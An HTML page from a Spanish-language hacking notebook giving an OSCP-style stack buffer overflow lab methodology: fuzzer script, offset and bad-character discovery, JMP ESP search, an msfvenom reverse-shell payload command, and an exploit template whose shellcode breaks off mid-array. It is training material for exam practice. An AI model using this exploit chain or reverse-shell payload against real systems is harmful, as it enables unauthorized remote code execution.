<!DOCTYPE HTML>
<html lang="es" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Secronomicón</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Secronomicón</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <div style="break-before: page; page-break-before: always;"></div><h1 id="oscp-metodología-stack-based"><a class="header" href="#oscp-metodología-stack-based">OSCP Metodología Stack Based</a></h1>
<h2 id="objetivo"><a class="header" href="#objetivo">Objetivo</a></h2>
<p>Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice una síntesis de los comandos utilizados disponibles en esta <a href="guides/oscp_bof/../../cheat_sheets/pwning/bof-oscp.html">Cheat Sheet</a>.</p>
<h2 id="configuración-de-ambiente-de-práctica"><a class="header" href="#configuración-de-ambiente-de-práctica">Configuración de ambiente de práctica</a></h2>
<ol>
<li>Deshabilitar firewall y/o habilitar reglas para comunicación a través de red.</li>
<li>Deshabilitar protección DEP de Windows.</li>
<li>Instalación de herramientas (binario, immunity debugger, <code>mona.py</code>).</li>
<li>Generación de workspace para <code>mona.py</code>.</li>
</ol>
<h3 id="firewall"><a class="header" href="#firewall">Firewall</a></h3>
<h4 id="traza-icmp"><a class="header" href="#traza-icmp">Traza ICMP</a></h4>
<p>En la sección de configuración avanzada habilitar reglas <strong>tanto de entrada como de salida</strong> de ICMP v4 y v6 para permitir comunicación entre la máquina que se ocupará para debuggear el binario y la máquina de donde se lanzará el exploit.</p>
<p><img src="guides/oscp_bof/./images/bof_1.png" alt="Reglas de Firewall" /></p>
<h3 id="deshabilitado-de-dep"><a class="header" href="#deshabilitado-de-dep">Deshabilitado de DEP</a></h3>
<p>En un command prompt como administrador ejecutar: <code>bcdedit.exe /set {current} nx AlwaysOff</code> para deshabilitar la <em>prevención de ejecución de datos (DEP)</em>. Después de ejecutarlo y reiniciar el sistema se puede validar que se deshabilitó correctamente entrando a <code>Panel de Control &gt; Sistema y seguridad &gt; Sistema &gt; Configuración avanzada del sistema &gt; Opciones avanzadas &gt; Configuración (de rendimiento) &gt; Prevención de ejecución de datos</code> este deberá salir sombreado de gris.</p>
<p><img src="guides/oscp_bof/./images/bof_2.png" alt="Deshabilitado de DEP" /></p>
<ol>
<li>Configuración avanzada del sistema.</li>
<li>Configuración de rendimiento.</li>
<li>Pestaña de prevención de ejecución de datos.</li>
<li>Sombreado gris de correcto deshabilitado.</li>
</ol>
<h3 id="instalación-de-herramientas-mona"><a class="header" href="#instalación-de-herramientas-mona">Instalación de herramientas (Mona)</a></h3>
<p>Para añadir el script de <code>mona.py</code> a inmmunity debugger, es necesario descargar el script del <a href="https://github.com/corelan/mona">repositorio</a> y meterlo en la ruta <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code>.</p>
<p><img src="guides/oscp_bof/./images/bof_3.png" alt="Deshabilitado de DEP" /></p>
<h3 id="generación-de-workspace-para-monapy-opcional"><a class="header" href="#generación-de-workspace-para-monapy-opcional">Generación de workspace para <code>mona.py</code> (opcional)</a></h3>
<p>Para facilitar el uso de <code>mona.py</code>, se puede generar un entorno de trabajo (a secas es una carpeta) que contendría lo que <code>mona.py</code> genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando <code>!mona config -set workingfolder C:\Users\SrRequiem\Desktop\%p</code> se indicaría el lugar y a partir del primer comando de <code>mona.py</code> que genere archivos, se podrá ver reflejado en el sistema de archivos.</p>
<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
<p>En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.</p>
<h3 id="plantilla-de-fuzzer"><a class="header" href="#plantilla-de-fuzzer">Plantilla de fuzzer</a></h3>
<pre><code class="language-python">#from pwn import *
import socket, sys, time

if len(sys.argv) &lt; 2:
   print &quot;\n[!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt; &quot; + &quot;&lt;remote-port&gt;\n&quot;
   sys.exit(0)
# Variables globales
ip_address = sys.argv[1]
rport = int(sys.argv[2])

if __name__ == '__main__':
   contador = 100
   #p1 = log.progress(&quot;Data&quot;) Log de datos en pwntools
   while True:
      #p1.status(f&quot;Enviando {contador} bytes.&quot;) Log de datos en pwntools
      print &quot;Enviando %s bytes.&quot; % contador
      buffer = 'A' * contador
      try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip_address, rport))

         data = s.recv(1024)
         #s.send(&quot;USER srrequiem\r\n&quot;)
         #data = s.recv(1024)
         s.send(&quot;%s\r\n&quot; % buffer)
         data = s.recv(1024)
         contador += 100
         #En algunas ocasiones no suele romperse la conexion lo que evita entrar
         #al codigo de la excepcion por lo que se puede considerar meter un sleep
         #para visualizar en que valor de la iteracion se pausa la ejecucion del binario
         time.sleep(1)
      except Exception as ex:
         print &quot;\n[!] Ha habido un error de conexion\n&quot;
         print ex
         sys.exit(1)
</code></pre>
<p>Por medio del script se puede buscar el cambio del <code>EIP</code> de manera automática.</p>
<p><img src="guides/oscp_bof/./images/bof_4.png" alt="Cambio de valor de EIP" /></p>
<p><strong>Generacion de patrón</strong></p>
<p><code>msf-pattern_create -l &lt;longitud de bytes&gt;</code></p>
<p><code>!mona pattern_create &lt;longitud de bytes&gt;</code></p>
<p>Después de provocar el fallo con el patrón, la dirección <code>EIP</code> se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga <code>EIP</code> ahora lo identificaremos para saber el offset específico.</p>
<p><img src="guides/oscp_bof/./images/bof_5.png" alt="EIP con valor de patrón" /></p>
<p><strong>Identificación offset</strong></p>
<p><code>msf-pattern_create -l &lt;EIP&gt;</code></p>
<p><code>!mona pattern_offset &lt;EIP&gt;</code></p>
<p><img src="guides/oscp_bof/./images/bof_6.png" alt="EIP con valor de patrón" /></p>
<ol>
<li>Offset.</li>
<li>EIP.</li>
</ol>
<p><em>Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente. Ejemplo: 1052 'A' y 4 'B' en este caso el <code>EIP</code> valdría <code>42424242</code></em></p>
<h2 id="identificar-bad-chars"><a class="header" href="#identificar-bad-chars">Identificar Bad Chars</a></h2>
<h3 id="manual"><a class="header" href="#manual">Manual</a></h3>
<p>Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy fácil perder algún byte de vista muy fácil.</p>
<p>El proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del <code>ESP</code> y buscar cuales son los que no se visualizan correctamente, identificandolos así uno a uno. Se puede generar la colección de bytes con <code>mona.py</code> con el comando <code>!mona bytearray</code> dentro de Immunity Debugger para tener la colección y poder incorporarla al payload.</p>
<h4 id="colección-plana"><a class="header" href="#colección-plana">Colección plana</a></h4>
<p><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</code></p>
<h4 id="colección-en-arreglo"><a class="header" href="#colección-en-arreglo">Colección en arreglo</a></h4>
<pre><code class="language-python">badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
)
</code></pre>
<p>Después de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del <code>ESP</code> dándo click derecho en el registro y seleccionando la opción <code>Follow in Dump</code>, de la sección ubicada en la esquina inferior izquierda se nos desplegará el contenido del registro para poder identificar los badchars manualmente.</p>
<p><img src="guides/oscp_bof/./images/bof_11.png" alt="Follow in Dump Immunity Debugger" /></p>
<p>Se anexan ejemplos de cómo se verían los badchars en el dump de hexadecimal (sección inferior izquierda de Immunity Debugger).</p>
<p><img src="guides/oscp_bof/./images/bof_12.png" alt="Ejemplo Badchar 1" /></p>
<p><img src="guides/oscp_bof/./images/bof_13.png" alt="Ejemplo Badchar 2" /></p>
<h3 id="automático"><a class="header" href="#automático">Automático</a></h3>
<p>El proceso se puede optimizar usando <code>mona.py</code> de manera iterativa, con los siguientes comandos <code>mona.py</code> nos devolverá los badchars identificados.</p>
<ol>
<li><code>!mona bytearray</code>: Generará archivos con arreglo de badchars.</li>
<li><code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;dirección de ESP&gt;</code>: Comparará los badchars contenidos respecto al payload ubicado en el <code>ESP</code> (recordando que payload = filler + eip + badchars).</li>
<li><code>!mona bytearray -cpb '\x00'</code>: Generará archivos con arreglo de badchars exceptuando los indicados.</li>
<li>Repetir proceso hasta encontrar todos los badchars.</li>
</ol>
<h2 id="búsqueda-de-dirección"><a class="header" href="#búsqueda-de-dirección">Búsqueda de dirección</a></h2>
<p>Aquí se realiza la búsqueda de la instrucción <code>JMP ESP</code> (valores hexadecimales <code>\xff\xe4</code>) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por <code>mona.py</code> en <code>False</code>).</p>
<p><em>Nota: se puede hacer uso de <code>msf-nasm_shell</code> para ver el valor de los <code>OP codes</code> (en este caso <code>jmp ESP</code>) en caso que se requiera.</em></p>
<p><img src="guides/oscp_bof/./images/bof_7.png" alt="OP code jmp ESP" /></p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona modules</code></p>
<p><strong>Ejemplo</strong></p>
<p><img src="guides/oscp_bof/./images/bof_8.png" alt="Mona modules" /></p>
<h3 id="búsqueda-de-apuntador-en-dll"><a class="header" href="#búsqueda-de-apuntador-en-dll">Búsqueda de apuntador en dll</a></h3>
<p>Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción <code>\xff\xe4</code>.</p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona find -s &quot;\xff\xe4&quot; -m &lt;nombre de dll&gt;</code></p>
<p>Se desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (<code>PAGE_EXECUTE_READ</code>); y de escritura solamente (<code>PAGE_READ_ONLY</code>), <strong>hay que tomar en cuenta sólo aquellas que cuenten con ejecución</strong> (<code>PAGE_EXECUTE_READ</code>). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (<code>False</code>).</p>
<p><img src="guides/oscp_bof/./images/bof_9.png" alt="JMP ESP en dll" /></p>
<ol>
<li>Comando.</li>
<li>Direcciones útiles para usar en EIP (buscar aquellas que en el valor de la dirección no contenga ningún badchar).</li>
<li>Permisos.</li>
<li>Protecciones.</li>
</ol>
<h2 id="generación-de-shellcode"><a class="header" href="#generación-de-shellcode">Generación de shellcode</a></h2>
<p>Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la <code>EIP</code>.</p>
<p><strong>Comando de ejemplo</strong></p>
<p><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code></p>
<p>Tener en consideración:</p>
<ul>
<li>Sistema operativo.</li>
<li>Arquitectura.</li>
<li>Payload.</li>
<li>Formato (python, c, exe, etc).</li>
<li>Variables de escucha y/o comando a ejecutar.</li>
<li>Encoding (extra: <code>-i 3</code> para número de iteraciones para encodear).</li>
<li>BadChars.</li>
<li>Función de salida (para evitar que el proceso termine usar <code>seh</code> o <code>thread</code>).</li>
</ul>
<p><em><strong>Si se da el caso que los badchars sean bastantes tal que la generación del shellcode no se realice satisfactoriamente, considerar quitar el encoder <code>x86/shikata_ga_nai</code> para que automáticamente se utilicé el encoder que cumpla con los requisitos (colección de badchars a evitar).</strong></em></p>
<h2 id="generación-de-exploit"><a class="header" href="#generación-de-exploit">Generación de exploit</a></h2>
<h3 id="ejemplo-de-exploit-final"><a class="header" href="#ejemplo-de-exploit-final">Ejemplo de exploit final</a></h3>
<pre><code class="language-python">from struct import pack
import socket, sys

if len(sys.argv) &lt; 2:
    print &quot;\n [!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt;&quot; + &quot;&lt;remote-port&gt; \n&quot;
    sys.exit(0)

ip_address = sys.argv[1]
rport = int(sys.argv[2])
shellcode =  b&quot;&quot;
shellcode += b&quot;\xb8\x36\xda\x75\x0f\xda\xd5\xd9\x74\x24\xf4\x5b\x2b&quot;
shellcode += b&quot;\xc9\xb1\x5f\x83\xc3\x04\x31\x43\x10\x03\x43\x10\xd4&quot;
shellcode += b&quot;\x2f\xce\x68\xaf\x10\x8c\xac\x01\x49\x9b\x76\x69\x30&quot;
shellcode += b&quot;\x55\xbe\x20\x9d\xa4\x1a\x57\x9d\x2d\x66\x54\xfb\xa0&quot;
shellcode += b&quot;\x75\xc8\xf6\x32\x68\x08\x59\x9b\x32\x1d\xb8\x35\x8a&quot;
shellcode += b&quot;\x2e\x1c\xec\x8c\x49\xea\xa6\xae\xc5\xfb\xef\x11\xbd&quot;
